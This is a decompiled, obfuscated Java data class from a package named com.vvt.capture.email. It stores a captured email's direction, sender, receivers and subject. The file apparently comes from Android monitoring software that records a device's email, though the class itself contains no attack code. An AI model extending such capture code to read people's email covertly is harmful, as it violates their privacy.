package com.vvt.capture.email;

import java.util.Arrays;
import java.util.List;

public class c
{
  private long a;
  private boolean b;
  private int c;
  private String d;
  private String[] e;
  private String[] f;
  private String[] g;
  private String h;
  private List i;
  private String j;
  
  public long a()
  {
    return this.a;
  }
  
  public void a(int paramInt)
  {
    this.c = paramInt;
  }
  
  public void a(long paramLong)
  {
    this.a = paramLong;
  }
  
  public void a(String paramString)
  {
    this.d = paramString;
  }
  
  public void a(List paramList)
  {
    this.i = paramList;
  }
  
  public void a(boolean paramBoolean)
  {
    this.b = paramBoolean;
  }
  
  public void a(String[] paramArrayOfString)
  {
    this.e = paramArrayOfString;
  }
  
  public void b(String paramString)
  {
    this.h = paramString;
  }
  
  public void b(String[] paramArrayOfString)
  {
    this.f = paramArrayOfString;
  }
  
  public boolean b()
  {
    return this.b;
  }
  
  public String c()
  {
    return this.d;
  }
  
  public void c(String paramString)
  {
    this.j = paramString;
  }
  
  public void c(String[] paramArrayOfString)
  {
    this.g = paramArrayOfString;
  }
  
  public String[] d()
  {
    return this.e;
  }
  
  public String[] e()
  {
    return this.f;
  }
  
  public String[] f()
  {
    return this.g;
  }
  
  public String g()
  {
    return this.h;
  }
  
  public List h()
  {
    return this.i;
  }
  
  public String i()
  {
    return this.j;
  }
  
  public String toString()
  {
    String str1 = "Email(%s): sender=%s, receiver=%s, subject=%s";
    Object[] arrayOfObject = new Object[4];
    String str2 = null;
    boolean bool = this.b;
    if (bool) {}
    for (String str3 = "IN";; str3 = "OUT")
    {
      arrayOfObject[0] = str3;
      str2 = this.d;
      arrayOfObject[1] = str2;
      str2 = Arrays.toString(this.e);
      arrayOfObject[2] = str2;
      str2 = this.h;
      arrayOfObject[3] = str2;
      return String.format(str1, arrayOfObject);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */